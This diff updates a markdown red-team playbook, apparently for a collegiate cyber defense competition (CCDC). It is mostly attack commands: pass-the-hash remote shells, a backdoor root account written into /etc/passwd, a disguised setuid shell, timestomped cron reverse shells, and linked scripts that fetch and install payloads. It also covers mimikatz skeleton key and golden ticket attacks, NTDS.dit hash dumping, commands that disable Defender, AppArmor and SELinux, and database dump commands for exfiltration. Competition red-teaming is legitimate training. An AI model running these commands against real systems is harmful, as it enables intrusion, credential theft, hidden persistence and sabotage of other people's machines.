@@ -3,7 +3,8 @@ layout: blank
 pagetitle: Red Teaming for CCDC
 ---
 
-**CCDC playbook**
+## Playbook
+
 - Make sure to have a sheet with all host/shell info, so if we lose a shell we know where we lost it
 - Opening Salvo:
   - Quickly nmap scan for port 445, as this will almost always be our gateway in
@@ -17,37 +18,78 @@ pagetitle: Red Teaming for CCDC
   - Additionally, one final `sudo nmap -sn -T4 {IP_range} | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u > ips.txt` to just figure out what hosts are online
     - Then pass alive hosts to autorecon with `sudo autorecon -t ips.txt -p 21,22,23,25,53,80,110,111,135,139,143,389,443,445,465,636,873,993,995,1025-1030,1080,1433,1521,1723,3306,3389,5432,5900,5985,6379,6667,8000,8080,8443,8888 -o autorecon_results --max-scans 100`
 
-- **Persistence:**
-  - **Domain:**
-    - Run `mass_user_add.sh` with domain admin creds/hash against a DC to add a bunch of domain admins
-      - On Windows side, [add_domain_users.ps1](https://khaelkugler.com/scripts/add_domain_users.ps1)
-    - Grab `krbtgt` (and other) hashes with `impacket-secretsdump -hashes :{hash} {domain}/{user}@{DC_IP}` 
-      - Alternatively `impacket-secretsdump {domain}/{user}:'{password}'@{DC_IP}` with a password
-  - **Windows:**
-    - When installing the exes, make sure to use `-o` with `iwr` or we'll just get the HTTP connection info lmfao
-    - First, run [windows_add_payloads.ps1](https://khaelkugler.com/scripts/windows_add_payloads.ps1) to add the file to each of the locations
-    - Then, run [windows_persistence.ps1](https://khaelkugler.com/scripts/windows_persistence.ps1)
-    - Shells:
-      - 135 - use `wmiexec.py -hashes :{hash} '{domain}/{user}@{ip}'`
-      - 139/445 - use `psexec.py -hashes :{hash} '{domain}/{user}@{ip}'` or `smbexec`
-      - 5985 - use `evil-winrm -i {IP} -u '{domain}\{username}' -H {hash} -r {domain}`
-        - `-r` optional, used for kerberos
-  - **Linux:**
-    - Run [linux_persistence.sh {payload_name} {optional_absolute_path_to_payload}](https://khaelkugler.com/scripts/linux_persistence.sh) while hosting the payload
-      - Make sure to point the script to the correct location to pull the file from
-    - Add SSH keys
-      - `mkdir /root/.ssh` and add key to `/root/.ssh/authorized_keys`
-    - Modify `/etc/passwd` and `/etc/ssh/sshd_config`
-      - `echo 'wwwdata:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd && chattr +i /etc/passwd && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && chattr +i /etc/ssh/sshd_config`
-    - Use setuid binaries in weird locations (like a fake .kernel file):
-      - `cp /bin/zsh /.kernel && chmod +sss /.kernel && touch -d "4 May 2024" /.kernel && chattr +i /.kernel`
-      - `chattr` makes the file immutable (and gives ROOT a generic access denied error???)
-    - Cron jobs:
-      - Make innocuous cron jobs that are just shells sending out continuous connections
-      - Upload shell to `/etc/cron.hourly/locate`, `touch -d "12 Jul 2024" /etc/cron.hourly/locate` to make it non-sus, and `chattr +i /etc/cron.hourly/locate`
-        - Has to start with a `#!/bin/bash`
+## Machine Persistence
 
-**AutoRecon**
+**Windows:**
+- When installing the exes, make sure to use `-o` with `iwr` or we'll just get the HTTP connection info lmfao
+- First, run [windows_add_payloads.ps1](https://khaelkugler.com/scripts/windows_add_payloads.ps1) to add the file to each of the locations
+- Then, run [windows_persistence.ps1](https://khaelkugler.com/scripts/windows_persistence.ps1)
+- Shells:
+  - 135 - use `wmiexec.py -hashes :{hash} '{domain}/{user}@{ip}'`
+  - 139/445 - use `psexec.py -hashes :{hash} '{domain}/{user}@{ip}'` or `smbexec`
+  - 593 - use `atexec.py -hashes :{hash} '{domain}/{user}@{ip}' "{command}"`
+  - 3389 - user `xfreerdp /u:{user} /d:{domain} /pth:{hash} /v:{IP}`
+    - `/p:{password}` if we have it
+  - 5985 - use `evil-winrm -i {IP} -u '{domain}\{username}' -H {hash} -r {domain}`
+    - `-r` optional, used for kerberos
+
+**Linux:**
+- Run [linux_persistence.sh {payload_name} {optional_absolute_path_to_payload}](https://khaelkugler.com/scripts/linux_persistence.sh) while hosting the payload
+  - Make sure to point the script to the correct location to pull the file from
+- Add SSH keys
+  - `mkdir /root/.ssh` and add key to `/root/.ssh/authorized_keys`
+- Modify `/etc/passwd` and `/etc/ssh/sshd_config`
+  - `echo 'wwwdata:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd && chattr +i /etc/passwd && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && chattr +i /etc/ssh/sshd_config`
+- Use setuid binaries in weird locations (like a fake .kernel file):
+  - `cp /bin/zsh /.kernel && chmod +sss /.kernel && touch -d "4 May 2024" /.kernel && chattr +i /.kernel`
+  - `chattr` makes the file immutable (and gives ROOT a generic access denied error???)
+- Cron jobs:
+  - Make innocuous cron jobs that are just shells sending out continuous connections
+  - Upload shell to `/etc/cron.hourly/locate`, `touch -d "12 Jul 2024" /etc/cron.hourly/locate` to make it non-sus, and `chattr +i /etc/cron.hourly/locate`
+    - Has to start with a `#!/bin/bash`
+
+## Domain Persistence
+
+**Skeleton Key**
+- Implants into LSASS and creates master password working for any AD account
+- `mimikatz "privilege::debug" "misc::skeleton" "exit"` - adds `mimikatz` as a password to all users
+
+**MemSSP**
+- Injects a new Security Support Provider into LSASS
+- `mimikatz "privilege::debug" "misc::memssp" "exit"`
+- After each authentication, password is stored in `C:\Windows\System32\mimilsa.log` or `C:\Windows\System32\kiwissp.log`
+
+**Golden Certificate**
+- Performed with:
+  - `certipy ca -backup -ca '{certificate_name}' -username {user}@{domain} -hashes {hash}`
+  - `certipy forge -ca-pfx {ca_private_key} -upn {user}@{domain} -subject 'CN={user},CN=Users,DC={domain},DC={tld}`
+
+**Golden Ticket**
+- Trying to get the KDC's secret key to create self-made tickets for any service on the system
+- Requires full control over the DC or a being part of a Domain Admin group
+- Dump `krbtgt` NTLM hash with mimikatz (unless we already have it)
+	- `lsadump::lsa /patch`
+- After grabbing the hash, from any domain user:
+	- `kerberos::purge` to delete any existing tickets
+	- `kerberos::golden /user:{domain_user} /domain:{domain} /sid:{domain_SID} /krbtgt:{krbtgt_NTLM_hash} /ptt`
+		- The `domain_SID` can be gathered from whoami /user
+- This will essentially give the domain user Domain Admin privileges
+	- `PsExec.exe \\{domain_controller_dnshostname} powershell`
+		- Can't use the IP of the DC, as that will resort to NTLM
+		
+**Shadow Copies**
+- Volume Shadow Service is a Microsoft backup technology that allows creation of snapshots
+- As a domain admin, we can create a shadow copy and extract the NTDS.dit database file
+- Installed from [here](https://www.microsoft.com/en-us/download/details.aspx?id=23490)
+- Run `vshadow.exe -nw -p C:`
+- Then copy the Database from the shadow copy to the C: folder
+	- `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak`
+- Then, save the SYSTEM hive with `reg.exe save hklm\system c:\system.bak`
+- We can now access all NTLM hashes and Kerberos keys using `impacket-secretsdump`
+	- `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL`
+
+
+## Autorecon
 - Overall status: `find autorecon_results -name "*.txt" -type f -exec grep -l "open" {} \; | sort`
 - Common vulns: `grep -r "MS17-010\|CVE-\|Anonymous\|Password:" autorecon_results`
 - Anonymous access: `grep -r "Anonymous" autorecon_results`
@@ -55,7 +97,7 @@ pagetitle: Red Teaming for CCDC
 - Passwords: `grep -r "Password:\|Credentials:" autorecon_results`
 - Missing SMB signing: `grep -r "SMB signing required: false" autorecon_results`
 
-**Sliver**
+## Sliver
 - Can build from source with `sudo apt install golang-go`, `curl https://sliver.sh/install | sudo bash`, and `cd sliver && make`
 - To make sure we don't kill the mf server, let's operate from a client
   - Start up tmux and run `sliver-server`
@@ -83,7 +125,7 @@ pagetitle: Red Teaming for CCDC
   - Install all with `armory install all`
   - Sharphound: `sharp-hound-4 -- '-c all,GPOLocalGroup'`
 
-**Killing Services**
+## Killing Services
 - Soft breaks:
   - `systemctl stop {service}` 
     - This is too kind, we shant do this :>
@@ -105,7 +147,36 @@ pagetitle: Red Teaming for CCDC
   - `timebomb.sh`
   - Corrupt bootloader partitions
 
-**Misc**
+## Trolling
+- By far the most important part of CCDC
+- `wall "dance"`
+- Set all computers to same background:
+  - GPO management > right-click domain > Create GPO in domain and link here > Right click on new GPO + edit > User Configuration\Policies\Administrative Templates\Desktop\Desktop > desktop wallpaper > select `enabled` + enter path of image and select fill for style > apply + ok > `gpupdate /force`
+
+**Defender/AppArmor/SELinux**
+- Defender:
+  - Disable with:
+    - `reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f`
+    - `gpedit.msc` > Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus > Turn off Microsoft Defender Antivirus > Enabled
+    - Just run all of these in powershell and defender should be lobotomized by the end:
+      - `'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All`
+      - `Set-MpPreference -DisableRealtimeMonitoring $true`
+      - `Remove-WindowsFeature Windows-Defender, Windows-Defender-GUI`
+      - `Stop-Service WinDefend -Force`
+      - `Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force`
+      - `Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" -Name "AllowAntivirus" -Value 0 -Type DWord`
+      - Then reboot
+  - Bypassing with FilelessPELoader:
+    - `https://github.com/SaadAhla/FilelessPELoader`
+- AppArmor:
+  - `sudo systemctl stop apparmor`, `sudo systemctl disable apparmor`, `sudo apt purge apparmor`
+- SELinux:
+  - Status with `sestatus`
+  - Temp disable: `sudo setenforce 0` or `sudo setenforce permissive`
+  - Permanent disable: set `SELINUX=enforcing` to `disabled` in `/etc/selinux/config` and reboot
+
+
+## Misc
 - Windows:
   - Shutdown: `shutdown /s /t 0`
   - Reboot: `shutdown /r /t 0`
@@ -119,43 +190,3 @@ pagetitle: Red Teaming for CCDC
   - `pkill -KILL -u {user}` - kill all of a user's processes
   - `kill -9 {pid}` to kill a specific process
 - Set date: `touch -d "4 May 2024"`
-
-
-**Databases**
-- Exploitation:
-  - Keep an eye out for older servers( MySQL 5.6/5.7, PostgreSQL 9.x, SQL Server 2012/2014)
-- Exfil:
-  - MySQL: `mysqldump -h [host] -u [user] -p[password] --all-databases > mysql_all_dbs.sql`
-  - PostgreSQL: `pg_dump -h [host] -U [username] -F c -b -v -f postgresql_all.dump postgres`
-  - MSSQL (table names): `Invoke-Sqlcmd -ServerInstance [server] -Username [user] -Password [password] -Query "SELECT name FROM master.sys.databases" | Format-Table -AutoSize > mssql_dbs.txt`
-  - Oracle: `sqlplus [username]/[password]@[host]/[SID] @extract.sql > oracle_data.txt`
-  - MongoDB: `mongodump --host [host] --port [port] --username [user] --password [password] --out ./mongodb_dump`
-
-**Trolling**
-- wall
-  - `wall "dance.`
-- Set all computers to same background:
-  - GPO management > right-click domain > Create GPO in domain and link here > Right click on new GPO + edit > User Configuration\Policies\Administrative Templates\Desktop\Desktop > desktop wallpaper > select `enabled` + enter path of image and select fill for style > apply + ok > `gpupdate /force`
-
-**Defender/AppArmor/SELinux**
-- Defender:
-  - Disable with:
-    - `reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f`
-    - `gpedit.msc` > Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus > Turn off Microsoft Defender Antivirus > Enabled
-    - Powershell:
-      - `C:\Program Files\Windows Defender\MpCmdRun.exe -RemoveDefinitions -All`
-      - `Set-MpPreference -DisableRealtimeMonitoring $true`
-      - `Remove-WindowsFeature Windows-Defender, Windows-Defender-GUI`
-      - `Stop-Service WinDefend -Force`
-      - `Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force`
-      - `Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" -Name "AllowAntivirus" -Value 0 -Type DWord`
-    - Then reboot?
-  - Bypassing with FilelessPELoader:
-    - `https://github.com/SaadAhla/FilelessPELoader`
-    - Can load from memory
-- AppArmor:
-  - `sudo systemctl stop apparmor`, `sudo systemctl disable apparmor`, `sudo apt purge apparmor`
-- SELinux:
-  - Status with `sestatus`
-  - Temp disable: `sudo setenforce 0` or `sudo setenforce permissive`
-  - Permanent disable: set `SELINUX=enforcing` to `disabled` in `/etc/selinux/config` and reboot
